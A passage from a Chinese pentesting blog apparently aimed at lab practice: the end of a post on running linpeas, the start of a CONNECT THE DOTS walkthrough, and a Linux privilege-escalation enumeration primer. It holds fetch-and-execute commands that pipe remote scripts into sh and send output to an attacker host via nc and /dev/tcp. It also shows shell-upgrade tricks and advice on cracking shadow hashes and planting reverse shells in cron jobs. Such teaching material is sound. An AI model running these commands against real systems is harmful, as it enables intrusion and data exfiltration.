<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl kaliip/linpeas.sh | sh | nc kaliip 81 </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720710.png" alt="image-20251125201949936"></p>
<p>这时，结果会显示在kali中，并且会把结果存入linpeas.txt（<strong>tee命令的作用，既显示又存储</strong>）</p>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154721011.png" alt="image-20251125202143325" style="zoom: 33%;" />

<ul>
<li><p>查看输出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less -r linpeas.txt		<span class="comment">#vi阅读性特别差</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154721036.png" alt="image-20251125202642868"></p>
<p><strong>-r  是让颜色、进度条、表格线等 ANSI 转义序列原样显示，而不是打成 ^[[31m 一堆乱码。</strong></p>
<blockquote>
<p>[!NOTE]</p>
<p><strong>靶机中curl不能用的情况</strong></p>
</blockquote>
<p><strong>kali</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nc -lvnp 80 &lt; linpeas.sh	<span class="comment">#将linpeas.sh重定向到80端口</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>nc -lvnp 80</code>：<ul>
<li><code>-l</code> 进入监听（listen）模式；</li>
<li><code>-v</code> 显示详细连接信息；</li>
<li><code>-n</code> 禁止 DNS 解析，加快响应；</li>
<li><code>-p 80</code> 指定本地端口为 80。</li>
</ul>
</li>
<li><code>&lt; linpeas.sh</code>：把文件内容重定向到 nc 的标准输入，<strong>一旦有客户端连接，就把整份脚本按字节推送出去</strong>。</li>
<li>结果<br>攻击机 80 端口变成 <strong>“一次性文件服务器”</strong></li>
</ul>
<p><strong>靶机</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt; /dev/tcp/kaliip/80 | sh	<span class="comment">#利用 Bash 内置的 /dev/tcp 伪设备，把远程脚本直接拉进内存并通过管道交给 sh 解释执行，全程不落盘。</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154808103.png" alt="image-20251125203359192"></p>
</li>
</ul>
</li>
</ul>
<p>没有curl也可以在内存中执行</p>
<ul>
<li><p><strong>LinEnum</strong>：</p>
<ul>
<li>较早的工具，适用于<strong>较老的系统</strong>，如果不支持linpeas，就选这个。</li>
</ul>
</li>
<li><p><strong>Linux-smart-enumeration</strong>：</p>
<ul>
<li>智能枚举，根据系统环境调整。</li>
</ul>
</li>
<li><p><strong>Linux-exploit-suggester</strong>：</p>
<ul>
<li>根据内核版本和系统信息，提供可用的漏洞利用建议。</li>
</ul>
</li>
<li><p><strong>Linuxprivchecker</strong>：</p>
<ul>
<li><strong>Python 编写</strong>，提供详细的权限检查。</li>
</ul>
</li>
<li><p><strong>unix-privesc-check</strong>：</p>
<ul>
<li>适用于 Unix 和 Linux 系统。</li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lmlsama.github.io/2025/12/27/test1/" data-id="cuid2-mSme45mhgu1lckcQ3jS" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-靶机精讲：CONNECT-THE-DOTS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/12/27/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9ACONNECT-THE-DOTS/" class="article-date">
  <time class="dt-published" datetime="2025-12-27T05:22:33.000Z" itemprop="datePublished">2025-12-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/12/27/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9ACONNECT-THE-DOTS/">靶机精讲：CONNECT THE DOTS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CONNECT-THE-DOTS-不懂jsfuck，polkit，图片隐写，莫尔斯码和断电隐患，你可能玩不转这台靶机。"><a href="#CONNECT-THE-DOTS-不懂jsfuck，polkit，图片隐写，莫尔斯码和断电隐患，你可能玩不转这台靶机。" class="headerlink" title="CONNECT THE DOTS - 不懂jsfuck，polkit，图片隐写，莫尔斯码和断电隐患，你可能玩不转这台靶机。"></a>CONNECT THE DOTS - 不懂jsfuck，polkit，图片隐写，莫尔斯码和断电隐患，你可能玩不转这台靶机。</h1><p>「红队笔记」靶机精讲之CONNECT THE DOTS ，又一台考验你的知识面的机器，至少涉及jsfuck、nfs、ftp多文件读取、getcap获取文件能力、polkit、文件图片隐写、莫尔斯码和断电隐患等知识，如果不理解这些知识点，你可能玩不转这台靶机。加油吧，少年。</p>
<p>参考视频：【「红队笔记」靶机精讲：CONNECT THE DOTS - 不懂jsfuck，polkit，图片隐写，莫尔斯码和断电隐患，你可能玩不转这台靶机。】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1vP411d7Lk?vd_source=4d00741bef1efdd09444b6c478d355a0">https://www.bilibili.com/video/BV1vP411d7Lk?vd_source=4d00741bef1efdd09444b6c478d355a0</a></p>
<hr>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sn 10.10.10.0/24</span><br><span class="line"><span class="built_in">sudo</span> nmap -sT --min-rate 10000 -p- ip</span><br><span class="line"><span class="built_in">sudo</span> nmap -sU --min-rate 10000 -p- ip</span><br><span class="line"><span class="built_in">sudo</span> nmap -sT -sV -sC -O -p,,, ip</span><br><span class="line"><span class="built_in">sudo</span> nmap --script=vuln -p,,, ip</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lmlsama.github.io/2025/12/27/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9ACONNECT-THE-DOTS/" data-id="cuid-f1HcUr-932NBIZvWqCNM" data-title="靶机精讲：CONNECT THE DOTS" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-提权精讲" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/12/26/%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2/" class="article-date">
  <time class="dt-published" datetime="2025-12-26T12:36:49.000Z" itemprop="datePublished">2025-12-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/12/26/%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2/">提权精讲</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Linux提权精讲：原理和枚举"><a href="#Linux提权精讲：原理和枚举" class="headerlink" title="Linux提权精讲：原理和枚举"></a>Linux提权精讲：原理和枚举</h1><h2 id="一、提权简介"><a href="#一、提权简介" class="headerlink" title="一、提权简介"></a>一、提权简介</h2><p><strong>提权就是提升权限，源自英语</strong><code>Privilege Escalation/PrivEsca/PE</code>它是指在渗透测试或红队行动中获得较低权限用户之后提升至更高权限用户,直至获得ROOT权限用户的过程</p>
<p><strong>我们很难直接获得系统的最高权限（root），因为****应用程序通常是按需配置权限的提权方法</strong></p>
<p><strong>没有一劳永逸的解决方案， 因此我们不能依赖某种或几种方法解决所有问题。然而我们可以研究常规手段和一般规律，解决大部分情况</strong></p>
<p>**很大程度上取决于目标系统的配置，我们可以通过分析像内核版本；已安装的应用程序；支持的编程语言；其他用户的凭据等关键因素，找到获得ROOT的方法  **</p>
<p><strong>关键元素包括：操作系统或应用程序中的错误配置漏洞，超特权用户，弱凭据…</strong></p>
<p><strong>提权的重要性体现:1,重置密码；2,想绕过访问控制来提取受保护的数据；3,编辑软件配置；4,开启持久化，以便稍后可以再次访问这台计算机；5,更改现有或新建用户的用户权限；6,执行任何管理命令</strong></p>
<h2 id="二、权限体系（安全机制）"><a href="#二、权限体系（安全机制）" class="headerlink" title="二、权限体系（安全机制）"></a>二、权限体系（安全机制）</h2><h3 id="1-常用安全机制"><a href="#1-常用安全机制" class="headerlink" title="1. 常用安全机制"></a>1. 常用安全机制</h3><ul>
<li><strong>UGO 体系</strong>：UGO 是 Linux 文件权限管理的基础，代表三种身份（U：文件所有者，G：文件的属组，O：其他人）和三种权限（r：读  4，w：写  2，x：执行  1）。</li>
</ul>
<p><img src="https://images2018.cnblogs.com/blog/952033/201809/952033-20180902120612711-514991426.png" alt="img"></p>
<blockquote>
<p><strong>chmod - change file mode bits</strong>	<strong>改变文件的权限</strong></p>
<p><strong>chgrp - change group ownership</strong>	<strong>改变文件所属的组</strong></p>
<p><strong>chown - change file owner and group</strong>	<strong>改变文件所有者</strong></p>
</blockquote>
<p><img src="/images/image-20251125140935928.png?lastModify=1766751620" alt="image-20251125140935928"></p>
<p>**	**<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9573355.html">Linux ugo 权限 - sparkdev - 博客园</a></p>
<ul>
<li><strong>SUID&#x2F;SGID</strong>：SUID 让普通用户临时拥有文件属主的执行权限，SGID 让目录下新建文件的属组继承该目录的属组。</li>
</ul>
<p>**	**<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leehang/p/18995417">Linux 文件特殊权限位（SUID、SGID、Sticky Bit）的应用 - LeeHang - 博客园</a></p>
<ul>
<li><strong>Capabilities</strong>：Capabilities 机制将 root 的特权细分为多个单元，允许进程以特定的能力运行，而非给予全部 root 权限。</li>
</ul>
<p>**	**<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/11417781.html">Linux Capabilities 简介 - sparkdev - 博客园</a></p>
<ul>
<li><strong>AppArmor 和 SELinux</strong>：基于强制访问控制（MAC）策略，AppArmor 使用应用程序配置文件，SELinux 基于安全策略进行访问控制。</li>
</ul>
<p>**	**<a target="_blank" rel="noopener" href="https://blog.csdn.net/ytwoshuai/article/details/147517554">Linux安全模块：SELinux与AppArmor深度解析-CSDN博客</a></p>
<ul>
<li><strong>ACL（访问控制列表）</strong>：ACL 是 UGO 权限管理的补充，可针对特定用户或组设置文件或目录的访问权限。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiao_yi_xiao/article/details/117735278">Linux ACL访问控制权限完全攻略（超详细）_acl权限-CSDN博客</a></li>
</ul>
<h3 id="2-不常用安全机制"><a href="#2-不常用安全机制" class="headerlink" title="2. 不常用安全机制"></a>2. 不常用安全机制</h3><p>**包括 **<strong>Grsecurity</strong>、<strong>Pax</strong>、<strong>ExecShield</strong>、<strong>ASLR</strong>、<strong>TOMOYO Linux</strong>、<strong>SMACK</strong>、<strong>Yama</strong>、<strong>CGroups</strong>、<strong>Linux Namespaces</strong>、<strong>StackGuard</strong>、<strong>ProPolice</strong>、<strong>seccomp</strong>、<strong>ptrace</strong>、<strong>Capsicum</strong>、<strong>Mprotect</strong>、<strong>chroot</strong> 和 <strong>firejail</strong> 等。</p>
<h2 id="三、提权原理"><a href="#三、提权原理" class="headerlink" title="三、提权原理"></a>三、提权原理</h2><h3 id="1-基于权限体系（安全机制）的利用"><a href="#1-基于权限体系（安全机制）的利用" class="headerlink" title="1. 基于权限体系（安全机制）的利用"></a>1. 基于权限体系（安全机制）的利用</h3><ul>
<li><strong>低权限修改可执行文件或脚本</strong>：如果低权限用户可以修改以高权限运行的可执行文件或脚本，就可以通过植入恶意代码获取高权限。UGO-RWX+S</li>
<li><strong>利用 SUID&#x2F;SGID</strong>：查找具有 SUID&#x2F;SGID 权限的二进制文件，若存在漏洞或配置错误，可用于提权。</li>
<li><strong>利用 Capabilities</strong>：检查进程是否具有特定的能力，如 <code>CAP_SYS_ADMIN</code>、<code>CAP_DAC_OVERRIDE</code> 等，利用这些能力进行提权。</li>
</ul>
<h3 id="2-基于用户行为的利用"><a href="#2-基于用户行为的利用" class="headerlink" title="2. 基于用户行为的利用"></a>2. 基于用户行为的利用</h3><ul>
<li><strong>运维人员凭据泄露</strong>：低权限用户可能在使用高权限账户时，因备份或记录需要，将凭据保存在可访问的位置。如vim日志文件，断电之后的交换文件里面会有敏感信息</li>
</ul>
<h3 id="3-内存和-CPU-层面"><a href="#3-内存和-CPU-层面" class="headerlink" title="3.内存和 CPU 层面"></a>3.内存和 CPU 层面</h3><ul>
<li><strong>内存和 CPU 层面的凭据捕捉</strong>：在权限体系的上层，攻击者可能在内存和 CPU 层面拦截，捕捉，或是修改凭据信息。如：基于内存去读取一些敏感信息来实现内核利用</li>
</ul>
<h2 id="四、提权枚举"><a href="#四、提权枚举" class="headerlink" title="四、提权枚举"></a>四、提权枚举</h2><p><strong>提权枚举是提权过程中的关键步骤，不管是初始权限还是root权限</strong>	<strong>目的是收集系统和网络的信息，寻找可能的提权路径。</strong></p>
<p><strong>一般，把获得初始立足点（初始shell&#x2F;权限用户）之前叫****侦查</strong>&#x2F;信息收集，目的是撕口子，获得初始立足点</p>
<p><strong>获得初始立足点之后，为了提权，横向，渗透 打内网的信息收集叫****枚举</strong>。枚举比侦察有常规方法，收集的信息内容&#x2F;使用的工具&#x2F;命令 更明确</p>
<h3 id="1-升级命令行提示符-也叫终端升级（精）"><a href="#1-升级命令行提示符-也叫终端升级（精）" class="headerlink" title="1. 升级命令行提示符 &#x2F; 也叫终端升级（精）"></a>1. 升级命令行提示符 &#x2F; 也叫终端升级（精）</h3><p><strong>在获得初始 Shell 后，通常需要升级到一个更完整、更稳定、交互性更强的命令行环境。 即：将我们的shell升级为完整的tty</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n4240" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><span><span></span></span></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">python -c 'import pty; pty.spawn("/bin/bash")'<span class="cm-tab" role="presentation" cm-text="	">  </span>#最重要</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">stty raw -echo</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">export TERM=xterm-color<span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span>#TERM环境变量未设置  <span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>#这三条命令可以提高shell交互性</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span cm-text="" cm-zwsp=""></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">rlwrap nc -lvnp 443<span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span>#终端连接前加 rlwrap 这个工具可以便于上下翻找历史记录</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="/images/image-20251213193106998.png?lastModify=1766751620" alt="image-20251213193106998"></p>
<h3 id="2-手工枚举（最重要，最前）"><a href="#2-手工枚举（最重要，最前）" class="headerlink" title="2. 手工枚举（最重要，最前）"></a>2. 手工枚举（最重要，最前）</h3><h4 id="2-1-枚举用户和系统信息"><a href="#2-1-枚举用户和系统信息" class="headerlink" title="2.1 枚举用户和系统信息"></a>2.1 枚举用户和系统信息</h4><ul>
<li><p><strong>用户信息</strong>：</p>
<ul>
<li><code>whoami</code>：当前用户。</li>
</ul>
<p><img src="/images/image-20251124204549218.png?lastModify=1766751620" alt="image-20251124204549218"></p>
<ul>
<li><code>id</code>：当前用户 UID、GID 和所属组。</li>
</ul>
<p><img src="/images/image-20251124204603416.png?lastModify=1766751620" alt="image-20251124204603416"></p>
<p><strong><code>lxd</code></strong>：这是<strong>最关键的组</strong>，因为 LXD 是 Linux 容器管理工具，<strong>属于 <code>lxd</code> 组的用户可以创建和管理容器</strong>，并且<strong>默认可以挂载宿主机的文件系统</strong>，从而可能实现  <strong>容器逃逸 + 权限提升</strong>。</p>
<ul>
<li><code>who</code>：当前登录的用户和相关信息（Linux是一个多用户系统，可以看除了当前用户还有哪些用户登陆了当前系统）可以显示登陆时间，终端类型</li>
</ul>
<p><img src="/images/image-20251124204758722.png?lastModify=1766751620" alt="image-20251124204758722"></p>
<ul>
<li><code>w</code>：当前登录用户的详细信息，包括他们在做什么，及系统的负载信息；从哪个IP访问的，登陆时间，闲置时间，CPU的状态。</li>
</ul>
<p><img src="/images/image-20251124205033428.png?lastModify=1766751620" alt="image-20251124205033428"></p>
<ul>
<li><code>last</code>：系统最近的登录记录。（有暴露内核版本）</li>
</ul>
<p><img src="/images/image-20251124205111416.png?lastModify=1766751620" alt="image-20251124205111416"></p>
</li>
<li><p><strong>系统和内核信息</strong>：</p>
<ul>
<li><code>uname -a</code>：内核版本。</li>
</ul>
<p><img src="/images/image-20251124205406761.png?lastModify=1766751620" alt="image-20251124205406761"></p>
<ul>
<li><code>lsb_release -a</code>（需下载）：发行版信息。<code>cat /etc/os-release</code></li>
</ul>
<p><img src="/images/image-20251124210107540.png?lastModify=1766751620" alt="image-20251124210107540"><br><img src="/images/image-20251125144107865.png?lastModify=1766751620" alt="image-20251125144107865"></p>
<ul>
<li><code>cat /proc/version</code>：查看进程信息，获取内核和系统版本。</li>
</ul>
<p><img src="/images/image-20251124210214865.png?lastModify=1766751620" alt="image-20251124210214865"></p>
<ul>
<li><code>cat /etc/issue</code>：系统版本。</li>
</ul>
<p><img src="/images/image-20251124210254448.png?lastModify=1766751620" alt="image-20251124210254448"></p>
<ul>
<li><code>hostname/hostnamectl</code>：主机名和系统信息。<br><strong>1.标识他，这台机器叫什么名字</strong>    <strong>2.提供这台机器在网络中的角色(SQL的服务器：可能叫:sql account&#x2F;bill&#x2F;order)</strong><br><strong>便于在信息枚举&#x2F;收集过程中定位他的角色，排出数据的优先级和重要性</strong></li>
</ul>
<p><img src="/images/image-20251124211902915.png?lastModify=1766751620" alt="image-20251124211902915"></p>
</li>
<li><p><strong>网络信息</strong>：</p>
<ul>
<li><code>ip addr</code> 或 <code>ifconfig</code>：IP 地址和网卡信息。**    **<code>ifconfig</code>是旧版过时的命令，如果机器比较老，可能只支持这个<blockquote>
<p>**网卡信息：拿到一个shell之后，如果有多张网卡，配合着路由信息去看，可以发现内网更多信息  **<strong>IPv6</strong></p>
</blockquote>
</li>
</ul>
<p><img src="/images/image-20251124210435026.png?lastModify=1766751620" alt="image-20251124210435026"></p>
<ul>
<li><code>ip route</code>：查看路由表信息。</li>
</ul>
<p><img src="/images/image-20251124210608534.png?lastModify=1766751620" alt="image-20251124210608534"></p>
<ul>
<li><code>ip neigh</code>（查看网络邻居，内网比较有价值。） 或 <code>arp -a</code>（arp缓存，内网横向渗透常见）：可以看到局域网 IP 和 MAC 地址绑定关系。</li>
</ul>
<p><img src="/images/image-20251124210703713.png?lastModify=1766751620" alt="image-20251124210703713"></p>
<blockquote>
<p><strong>OU 就是 MAC 地址里的“厂商身份证”，<code>00:50:56:\*</code> 一出现，说明这台机器是 VMware 虚拟化出来的。</strong></p>
<table>
<thead>
<tr>
<th><strong>字段</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>192.168.168.2</code>&#x2F;<code>192.168.168.254</code></td>
<td><strong>邻居的 IP 地址</strong></td>
</tr>
<tr>
<td><code>dev ens33</code></td>
<td><strong>本机通过哪块网卡学到</strong></td>
</tr>
<tr>
<td><code>lladdr 00:50:56:...</code></td>
<td><strong>对方的****MAC 地址</strong></td>
</tr>
<tr>
<td><code>REACHABLE</code></td>
<td>**近期验证过，**<strong>可直接通信</strong></td>
</tr>
<tr>
<td><code>STALE</code></td>
<td>**超过验证时间，**<strong>下次发送前会先 ARP 确认</strong></td>
</tr>
</tbody></table>
</blockquote>
</li>
</ul>
<h4 id="2-2-枚举文件和进程"><a href="#2-2-枚举文件和进程" class="headerlink" title="2.2 枚举文件和进程"></a>2.2 枚举文件和进程</h4><ul>
<li><p><strong>文件和目录</strong>：</p>
<ul>
<li><code>ls -a</code> 或 <code>ls -liah</code>：查看<strong>隐藏文件</strong>和详细信息。</li>
</ul>
<p><img src="/images/image-20251124213426391.png?lastModify=1766751620" alt="image-20251124213426391"></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>-l</code></td>
<td><strong>长格式（权限、硬链接数、属主、属组、大小、时间、名字）</strong></td>
</tr>
<tr>
<td><code>-i</code></td>
<td><strong>显示****inode 号</strong>（文件系统里唯一标识）</td>
</tr>
<tr>
<td><code>-a</code></td>
<td><strong>显示****所有</strong>文件，包括以<code>.</code>开头的隐藏文件</td>
</tr>
<tr>
<td><code>-h</code></td>
<td><strong>人类可读大小（K、M、G）</strong></td>
</tr>
</tbody></table>
<ul>
<li><code>cat /etc/passwd</code>：系统用户信息。</li>
</ul>
<p><img src="/images/image-20251124214100796.png?lastModify=1766751620" alt="image-20251124214100796"></p>
<table>
<thead>
<tr>
<th><strong>字段序号</strong></th>
<th><strong>名称</strong></th>
<th><strong>含义说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td><strong>用户名</strong></td>
<td><strong>登录系统时使用的名称，如</strong><code>root</code>、<code>jack</code></td>
</tr>
<tr>
<td><strong>2</strong></td>
<td><strong>密码占位符</strong></td>
<td><strong>早期存加密密码，现在统一为</strong><code>x</code>，<strong>真实密码在<code>/etc/shadow</code></strong></td>
</tr>
<tr>
<td><strong>3</strong></td>
<td><strong>UID</strong></td>
<td><strong>用户 ID，</strong><code>0</code>表示 root，普通用户从<code>1000</code>开始</td>
</tr>
<tr>
<td><strong>4</strong></td>
<td><strong>GID</strong></td>
<td><strong>主组 ID，对应</strong><code>/etc/group</code>中的组</td>
</tr>
<tr>
<td><strong>5</strong></td>
<td><strong>描述信息（GECOS）</strong></td>
<td><strong>可选，通常为用户全名、联系方式等，可用</strong><code>chfn</code>修改</td>
</tr>
<tr>
<td><strong>6</strong></td>
<td><strong>家目录</strong></td>
<td><strong>用户登录后的默认工作目录，如</strong><code>/home/jack</code></td>
</tr>
<tr>
<td><strong>7</strong></td>
<td><strong>登录 Shell</strong></td>
<td><strong>用户登录后默认启动的 shell，如</strong><code>/bin/bash</code>，若为<code>/usr/sbin/nologin</code>则无法登录</td>
</tr>
</tbody></table>
<p><strong>有****家目录</strong>，很可能是活跃用户，价值↑**    <strong>最后一个是否有</strong>&#x2F;bin&#x2F;bash**，有了价值↑</p>
<ul>
<li><code>ls -liah /etc/shadow</code>看shadow文件是否全局可读，如果可读，可以尝试hash碰撞</li>
</ul>
<p><img src="/images/image-20251126192544697.png?lastModify=1766751620" alt="image-20251126192544697"></p>
<ul>
<li><code>cat /etc/crontab</code>：系统定时&#x2F;自动任务。</li>
</ul>
<p><img src="/images/image-20251124214606446.png?lastModify=1766751620" alt="image-20251124214606446"><br><strong>看自动任务的格式和权限，考虑能不能写反弹shell的提权</strong></p>
<ul>
<li><code>echo $PATH</code> 和 <code>env</code>：环境变量路径的查看，看看有没有特殊的路径。做基于路径的提权利用的时候，可以追加或在前面附上想让他优先读取的路径</li>
</ul>
<p><img src="/images/image-20251124214956647.png?lastModify=1766751620" alt="image-20251124214956647"></p>
<ul>
<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找 SUID 文件。查看有S位的可执行文件</li>
</ul>
<table>
<thead>
<tr>
<th><strong>片段</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>find</code></td>
<td><strong>查找文件</strong></td>
</tr>
<tr>
<td><code>/</code></td>
<td><strong>从根目录开始递归搜整个文件系统</strong></td>
</tr>
<tr>
<td><code>-perm -u=s</code></td>
<td><strong>匹配****用户位</strong>设置了<strong>SUID</strong>的文件（<code>-</code>表示“至少”该位）</td>
</tr>
<tr>
<td><code>-type f</code></td>
<td><strong>只列出普通文件，排除目录、链接等</strong></td>
</tr>
<tr>
<td><code>2&gt;/dev/null</code></td>
<td><strong>把“权限拒绝”等错误信息扔进黑洞，屏幕只保留结果</strong></td>
</tr>
<tr>
<td><code>perm</code></td>
<td><strong>就是****permission</strong>的缩写，告诉<code>find</code>“按权限位过滤文件”。</td>
</tr>
</tbody></table>
<p><img src="/images/image-20251125194041330.png?lastModify=1766751620" alt="image-20251125194041330"></p>
<ul>
<li><code>history</code>：列出历史操作记录（尤其是对于密码枚举操作的命令一定要查看，很可能会提示你，比如是否有特权 ）</li>
</ul>
<p><img src="/images/image-20251124213829673.png?lastModify=1766751620" alt="image-20251124213829673"></p>
<ul>
<li><code>which</code>：查询可执行文件，不管是系统自带还是下载的（看看机器装没装一些可能有用的程序，只显示第一次的查找结果，比如awk许多目录都有安装）</li>
</ul>
<p><img src="/images/image-20251125194304760.png?lastModify=1766751620" alt="image-20251125194304760"></p>
<table>
<thead>
<tr>
<th><strong>工具</strong></th>
<th><strong>一句话作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>awk</strong></td>
<td>*<em>按列&#x2F;模式切文本，</em>***“行列都能算”**轻量数据库。</td>
</tr>
<tr>
<td><strong>perl</strong></td>
<td><strong>超级脚本胶水</strong>，正则、网络、二进制一把梭，老派黑客最爱。</td>
</tr>
<tr>
<td><strong>python</strong></td>
<td><strong>现世代渗透第一语言，库多、跨平台、写马快。</strong></td>
</tr>
<tr>
<td><strong>ruby</strong></td>
<td><strong>Metasploit 母语，写 exploit 脚本短平快。</strong></td>
</tr>
<tr>
<td><strong>gcc</strong></td>
<td>**把 C&#x2F;C++ 源码变可执行文件，**<strong>内核 exploit 必备</strong>。</td>
</tr>
<tr>
<td><strong>vi&#x2F;vim</strong></td>
<td><strong>服务器必存编辑器，****“没图形也能改代码”</strong>。</td>
</tr>
<tr>
<td><strong>nmap</strong></td>
<td><strong>端口扫描代名词</strong>，扫段、OS 探、NSE 脚本一条龙。</td>
</tr>
<tr>
<td><strong>find</strong></td>
<td>**“按名、按权、按时间”**量找文件，提权枚举神器。</td>
</tr>
<tr>
<td><strong>netcat &#x2F; nc</strong></td>
<td><strong>“网络瑞士军刀”</strong>，正&#x2F;反向 Shell、传文件、端口监听全靠它。</td>
</tr>
<tr>
<td><strong>wget</strong></td>
<td>*<em>命令行下载器，</em>***“一句话拉马”**配。</td>
</tr>
<tr>
<td><strong>tftp</strong></td>
<td>**轻量 UDP 文件传输，**<strong>内网无认证秒传马</strong>。</td>
</tr>
<tr>
<td><strong>ftp</strong></td>
<td>**经典交互文件协议，**<strong>旧机维持通道</strong>常用。</td>
</tr>
<tr>
<td><strong>tmux &#x2F; screen</strong></td>
<td>**“断网不断 Shell”**多路复用，反弹 Shell 长驻后台。</td>
</tr>
</tbody></table>
</li>
</ul>
<p><strong>awk 切，perl 胶，python 写马，gcc 编；nmap 扫，find 搜，nc 弹 Shell，wget 拉；tmux 保活，vi 改，内网再用 tftp 快。</strong></p>
<ul>
<li><p><strong>进程信息</strong>：</p>
<ul>
<li><code>ps -ef/-A</code> （e是全部 f是列表格式）或 <code>ps aux</code>：查看全部进程。（u是启动进程的用户，x是没有连接到终端的进程）</li>
</ul>
<p><img src="/images/image-20251124215039681.png?lastModify=1766751620" alt="image-20251124215039681"></p>
<ul>
<li><code>ps axjf</code>：进程树。（x是没有连接到终端的进程）</li>
</ul>
<p><img src="/images/image-20251124215241352.png?lastModify=1766751620" alt="image-20251124215241352"></p>
<table>
<thead>
<tr>
<th><strong>字段名</strong></th>
<th><strong>含义说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>PPID</strong></td>
<td>**Parent Process ID，**<strong>父进程 ID</strong></td>
</tr>
<tr>
<td><strong>PID</strong></td>
<td>**Process ID，**<strong>当前进程 ID</strong></td>
</tr>
<tr>
<td><strong>PGID</strong></td>
<td>**Process Group ID，**<strong>进程组 ID</strong>（用于信号批量发送）</td>
</tr>
<tr>
<td><strong>SID</strong></td>
<td>**Session ID，**<strong>会话 ID</strong>（通常等于会话首领的 PID）</td>
</tr>
<tr>
<td><strong>TTY</strong></td>
